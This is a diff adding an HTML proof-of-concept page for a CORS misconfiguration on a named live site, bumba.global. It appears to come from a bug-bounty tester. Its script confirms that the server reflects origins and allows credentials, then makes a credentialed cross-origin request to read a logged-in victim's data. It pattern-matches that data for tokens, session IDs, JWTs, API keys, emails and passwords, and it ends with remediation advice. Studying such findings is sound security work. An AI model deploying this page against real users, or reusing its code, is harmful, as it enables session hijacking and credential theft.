@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Vulnerability PoC - N0t-Found404</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .card { border: 1px solid #ccc; padding: 20px; margin-bottom: 20px; border-radius: 5px; }
+        .success { background-color: #e6ffe6; border-color: #00cc00; }
+        .error { background-color: #ffebeb; border-color: #ff8080; }
+        .warning { background-color: #fffbe6; border-color: #ffcc00; }
+        pre { background-color: #f5f5f5; padding: 10px; overflow: auto; border-radius: 3px; }
+        button { padding: 10px 15px; background: #0066ff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background: #0052cc; }
+        .metadata { font-size: 0.9em; color: #666; }
+        .highlight { background-color: yellow; padding: 0 2px; }
+        #loading { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>CORS Vulnerability Proof of Concept</h1>
+        <div class="metadata">
+            <p><strong>Tester:</strong> N0t-Found404</p>
+            <p><strong>Test Date:</strong> 2025-04-04 15:44:32 (UTC)</p>
+            <p><strong>Target:</strong> bumba.global/cdn-cgi/rum</p>
+        </div>
+
+        <div class="card">
+            <h2>1. Test CORS Misconfiguration</h2>
+            <p>This will check if the server allows requests from this origin with credentials.</p>
+            <button onclick="checkCorsHeaders()">Check CORS Headers</button>
+            <div id="headersResult">Click the button to start the test.</div>
+        </div>
+
+        <div class="card">
+            <h2>2. Retrieve Authenticated Data</h2>
+            <p>This will attempt to retrieve data using the victim's authenticated session.</p>
+            <button onclick="fetchAuthenticatedData()">Attempt Data Retrieval</button>
+            <div id="dataResult">Click the button to start the test.</div>
+        </div>
+
+        <div class="card">
+            <h2>3. Security Impact Analysis</h2>
+            <div id="impactResult">Complete steps 1 and 2 to see the security impact.</div>
+        </div>
+
+        <div id="loading">Loading...</div>
+    </div>
+
+    <script>
+        // Step 1: Check CORS Headers
+        function checkCorsHeaders() {
+            const resultDiv = document.getElementById('headersResult');
+            resultDiv.innerHTML = "<p>Checking CORS headers for origin: <strong>" + window.location.origin + "</strong>...</p>";
+            
+            fetch("https://bumba.global/cdn-cgi/rum", {
+                method: "OPTIONS",
+                headers: {
+                    "Origin": window.location.origin
+                }
+            })
+            .then(response => {
+                const headers = {};
+                response.headers.forEach((value, key) => {
+                    headers[key] = value;
+                });
+                
+                const corsHeaders = [
+                    'access-control-allow-origin',
+                    'access-control-allow-credentials',
+                    'access-control-allow-methods',
+                    'access-control-expose-headers',
+                    'access-control-allow-headers'
+                ];
+                
+                let output = "<h3>CORS Headers Received:</h3><ul>";
+                corsHeaders.forEach(header => {
+                    if (headers[header]) {
+                        output += `<li><strong>${header}:</strong> ${headers[header]}</li>`;
+                    }
+                });
+                output += "</ul>";
+                
+                // Check if vulnerable
+                if (headers['access-control-allow-origin'] === window.location.origin && 
+                    headers['access-control-allow-credentials'] === "true") {
+                    output += `<div class="card success">
+                        <h3>✓ CORS Vulnerability Confirmed!</h3>
+                        <p>The server:</p>
+                        <ul>
+                            <li>Reflects back our arbitrary origin (<strong>${window.location.origin}</strong>)</li>
+                            <li>Allows credentials to be included with cross-origin requests</li>
+                        </ul>
+                        <p>This combination breaks the same-origin policy and allows cross-site reading of authenticated responses.</p>
+                    </div>`;
+                } else {
+                    output += `<div class="card error">
+                        <h3>✗ CORS Vulnerability not confirmed from this test.</h3>
+                        <p>Check if you're testing the correct endpoint or if the server configuration has changed.</p>
+                    </div>`;
+                }
+                
+                resultDiv.innerHTML = output;
+            })
+            .catch(error => {
+                resultDiv.innerHTML = `<div class="card error">
+                    <h3>Error checking CORS headers</h3>
+                    <p>${error.message}</p>
+                </div>`;
+            });
+        }
+        
+        // Step 2: Fetch authenticated data
+        function fetchAuthenticatedData() {
+            const resultDiv = document.getElementById('dataResult');
+            resultDiv.innerHTML = "<p>Attempting to retrieve authenticated data...</p>";
+            
+            fetch("https://bumba.global/cdn-cgi/rum", {
+                method: "POST",
+                credentials: "include"
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`Server returned ${response.status} ${response.statusText}`);
+                }
+                return response.text();
+            })
+            .then(data => {
+                // Clean the data for display
+                const cleanData = data.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                
+                // Highlight potentially sensitive data
+                const highlightedData = highlightSensitiveData(cleanData);
+                
+                let output = `<div class="card success">
+                    <h3>✓ Successfully retrieved data from victim's session!</h3>
+                    <p>A malicious website could extract this data from authenticated users without their knowledge.</p>
+                </div>
+                <h3>Response Data:</h3>
+                <pre>${highlightedData}</pre>`;
+                
+                resultDiv.innerHTML = output;
+                
+                // Update the impact analysis
+                analyzeSecurityImpact(data);
+            })
+            .catch(error => {
+                resultDiv.innerHTML = `<div class="card error">
+                    <h3>Failed to retrieve data</h3>
+                    <p>${error.message}</p>
+                    <p>This could be because:</p>
+                    <ul>
+                        <li>You're not currently logged in to bumba.global</li>
+                        <li>The endpoint requires specific parameters or headers</li>
+                        <li>The server has protective measures in place</li>
+                    </ul>
+                </div>`;
+            });
+        }
+        
+        // Helper function to highlight potentially sensitive data
+        function highlightSensitiveData(text) {
+            // Common patterns for sensitive data
+            const patterns = [
+                // Authentication tokens
+                /(["']?token["']?\s*[=:]\s*["']([^"']+)["'])/gi,
+                /(["']?auth["']?\s*[=:]\s*["']([^"']+)["'])/gi,
+                /(["']?key["']?\s*[=:]\s*["']([^"']+)["'])/gi,
+                /(["']?secret["']?\s*[=:]\s*["']([^"']+)["'])/gi,
+                
+                // Session identifiers
+                /(["']?session["']?\s*[=:]\s*["']([^"']+)["'])/gi,
+                /(["']?sessionid["']?\s*[=:]\s*["']([^"']+)["'])/gi,
+                
+                // User data
+                /(["']?user(id|name|email)["']?\s*[=:]\s*["']([^"']+)["'])/gi,
+                
+                // Common patterns for tokens
+                /(eyJ[a-zA-Z0-9_-]{5,}\.eyJ[a-zA-Z0-9_-]{5,})/g,  // JWT pattern
+                /([a-f0-9]{32,})/g,  // MD5/SHA hashes or similar
+                
+                // Other potentially sensitive data
+                /(["']?email["']?\s*[=:]\s*["']([^"']+)["'])/gi,
+                /(["']?password["']?\s*[=:]\s*["']([^"']+)["'])/gi
+            ];
+            
+            let highlightedText = text;
+            patterns.forEach(pattern => {
+                highlightedText = highlightedText.replace(pattern, '<span class="highlight">$&</span>');
+            });
+            
+            return highlightedText;
+        }
+        
+        // Step 3: Analyze security impact
+        function analyzeSecurityImpact(data) {
+            const resultDiv = document.getElementById('impactResult');
+            
+            // Check if data contains anything of interest
+            const containsSensitiveData = checkForSensitiveData(data);
+            
+            let output = `<h3>Security Impact Analysis</h3>`;
+            
+            if (containsSensitiveData) {
+                output += `<div class="card warning">
+                    <h3>⚠️ High Security Impact Detected</h3>
+                    <p>The data exposed through this CORS vulnerability appears to contain sensitive information:</p>
+                    <ul>`;
+                
+                containsSensitiveData.forEach(item => {
+                    output += `<li><strong>${item.type}:</strong> ${item.description}</li>`;
+                });
+                
+                output += `</ul>
+                    <h4>Potential Exploitation Scenarios:</h4>
+                    <ul>
+                        <li><strong>Session Hijacking:</strong> An attacker could use extracted session identifiers to impersonate users</li>
+                        <li><strong>Account Takeover:</strong> Authentication tokens could be used to gain unauthorized access</li>
+                        <li><strong>Data Exfiltration:</strong> Personal or sensitive information could be stolen</li>
+                        <li><strong>API Abuse:</strong> API keys could be used to make unauthorized API calls</li>
+                    </ul>
+                </div>`;
+            } else {
+                output += `<div class="card warning">
+                    <h3>ℹ️ CORS Vulnerability Present</h3>
+                    <p>While the CORS misconfiguration exists, the specific security impact depends on what data is exposed.</p>
+                    <p>Further testing is recommended to determine the sensitivity of exposed data and potential attack vectors.</p>
+                </div>`;
+            }
+            
+            output += `<h4>Recommendation:</h4>
+            <p>The server should be configured to:</p>
+            <ul>
+                <li>Use a specific whitelist of trusted domains in Access-Control-Allow-Origin</li>
+                <li>Never use * with Access-Control-Allow-Credentials:true</li>
+                <li>Avoid dynamically reflecting back arbitrary origins without validation</li>
+            </ul>`;
+            
+            resultDiv.innerHTML = output;
+        }
+        
+        // Helper function to check for sensitive data patterns
+        function checkForSensitiveData(data) {
+            const results = [];
+            
+            // Check for various patterns of sensitive data
+            if (data.match(/(eyJ[a-zA-Z0-9_-]{5,}\.eyJ[a-zA-Z0-9_-]{5,})/)) {
+                results.push({type: "JWT Token", description: "JSON Web Token that could provide authentication credentials"});
+            }
+            
+            if (data.match(/["']?token["']?\s*[=:]\s*["']([^"']+)["']/i)) {
+                results.push({type: "Authentication Token", description: "Token that could provide access to protected resources"});
+            }
+            
+            if (data.match(/["']?session(id)?["']?\s*[=:]\s*["']([^"']+)["']/i)) {
+                results.push({type: "Session Identifier", description: "Could be used for session hijacking attacks"});
+            }
+            
+            if (data.match(/["']?user(id|name|email)["']?\s*[=:]\s*["']([^"']+)["']/i)) {
+                results.push({type: "User Information", description: "Personal identifiable information exposed"});
+            }
+            
+            if (data.match(/["']?(api|app)key["']?\s*[=:]\s*["']([^"']+)["']/i)) {
+                results.push({type: "API Key", description: "Could be used to make unauthorized API calls"});
+            }
+            
+            // Generic check for any potentially sensitive-looking content
+            if (data.length > 50) {
+                results.push({type: "Substantial Response Data", description: "Detailed data that could contain sensitive information"});
+            }
+            
+            return results.length > 0 ? results : false;
+        }
+    </script>
+</body>
+</html>
